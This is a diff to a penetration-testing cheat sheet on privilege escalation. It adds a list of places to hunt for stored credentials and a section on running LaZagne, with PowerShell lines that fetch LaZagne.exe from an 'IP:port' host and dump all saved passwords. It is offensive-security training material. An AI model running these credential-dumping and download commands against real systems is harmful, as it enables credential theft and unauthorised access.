@@ -162,13 +162,20 @@ PS> powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 
 You may try to look for credentials. **Try password/key reuse**.
 
+* 🔑 Password, Passphrases
+* 🎫 Tickets <small>(ex: Kerberos)</small>, Tokens <small>(ex: GIT)</small>, Keys <small>(ex: SSH)</small>
+
+Common places to dig for credentials are:
+
 * 🔐 command history <small>(ex: ~/.bash_history, \*hist\*)</small>
 * 🌍 browser history and [saved passwords](others/browser.md)
-* 🛣️ [logs](/cybersecurity/blue-team/topics/logs.md) (`/var/log/`)
+* 🛣️ application and system [logs](/cybersecurity/blue-team/topics/logs.md) <small>(/var/log/)</small>
 * 🐚 backups <small>(.old, .bak, xxx~...)</small>
-* ✉️ conversations/mails (`/var/mail/`)
-* 🌳 website configurations (`.env`)
-* 👜 check the registry <small>(Windows, admin required)</small>
+* ✉️ conversations/mails <small>(/var/mail/)</small>
+* 🌳 configurations <small>(.env, .ini/.config/.cfg/.conf/.cnf, .sql)</small>
+* 🤖 scripts and tasks <small>(.sh/.ps1/.bat, cronjob)</small>
+* 👜 check the registry <small>(Windows, privilege required)</small>
+* 💎 Databases <small>(.\*db\*)</small>, Password Managers, Applications
 * ...
 
 Manually dig for interesting or unexpected files
@@ -178,6 +185,8 @@ Manually dig for interesting or unexpected files
 * `~/Desktop`: look for documents, passwords...
 * `~/Documents`: look for documents, passwords...
 * `%appdata%`: look for sensitive applications data
+
+Always put yourself in the target shoes.
 
 #### Linux Juicy Notes
 
@@ -244,6 +253,17 @@ PS> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" 
 PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
 PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
 ```
+
+#### Automated Tools
+
+[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+
+You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(8.9k ⭐)</small>.
+
+```ps
+PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
+PS> .\LaZagne.exe all
+```
 </div></div>
 
 <hr class="sep-both">
@@ -269,6 +289,7 @@ Look for interesting files "relatively" to your current user:
 ```ps
 $ find / -user $(whoami) -type f 2>/dev/null | grep -v /proc | grep -v /sys
 $ find / -type f -writable 2>/dev/null | grep -v /proc | grep -v /sys
+$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 $ ls /opt # why not
 $ find /opt/ \( -amin -5 -o -mmin -5 \) 2> /dev/null # recently modified/edited?
 ```
@@ -328,11 +349,6 @@ Exploiting Services
 
 * [MySQL user-defined functions](https://redteamnation.com/mysql-user-defined-functions/)
 * [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
-
-Credentials
-
-* Mimikatz, Kiwi, pypykatz
-* [LaZagne](https://github.com/AlessandroZ/LaZagne)
 
 Training
 
